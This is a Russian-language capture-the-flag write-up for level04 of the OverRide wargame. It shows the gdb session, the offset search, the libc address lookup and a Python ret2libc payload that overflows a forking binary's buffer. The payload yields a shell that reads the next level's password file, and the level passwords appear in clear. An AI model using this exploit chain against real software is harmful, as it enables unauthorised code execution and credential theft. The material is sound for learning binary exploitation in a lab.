[back](../defense.md)

```
cd /home/users/level04
ls -la
cat .pass
	kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
Ctrl+C
su level04
Password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04

level04@OverRide:~$ gdb level04
(gdb) r
	Give me some shellcode, k
```

Прога хочет пароль. 

Пытаемся переполнить буфер. 

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
	child is exiting...
	[Inferior 1 (process 2517) exited normally]
```

100 знаечений мало. Берем 200 значений

```
level04@OverRide:~$ gdb level04
(gdb) r
	Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Прога задумалась. Видать там есть fork. Принудительно прерываем ее.

```
^Z
	Program received signal SIGTSTP, Stopped (user).
	0xf7fdb440 in __kernel_vsyscall ()
```

Программа остается в бесконечном цикле при segfault. Нам нужно сказать GDB, чтобы он следовал за дочерним процессом.

Ввводим команду

```
(gdb) set follow-fork-mode child
(gdb) r
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/users/level04/level04
	[New process 2118]
	Give me some shellcode, k
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
	Program received signal SIGSEGV, Segmentation fault.
	[Switching to process 2118]
	0x41326641 in ?? ()
	(gdb)
```

Нашли смещение равное 156.

Теперь нам надо найти адреса system(), exit() и "/bin/sh"

```
0xf7e6aed0  system нашелся сразу

(gdb) b exit
Breakpoint 1 at 0xf7e5eb70 вот и exit
```

ищем последний адрес:
```
(gdb) info proc map
process 2118
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd8000 0xf7fda000     0x2000        0x0
	0xf7fda000 0xf7fdb000     0x1000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

составляем последовательность:

```
("A" * 156) + system + exit + "/bin/sh"
("A" * 156) + 0xf7e6aed0 + 0xf7e5eb70 + 0xf7f897ec
(python -c 'print "A"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level01
level04@OverRide:~$ (python -c 'print "A"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

Уровень пройден.

[back](../defense.md)
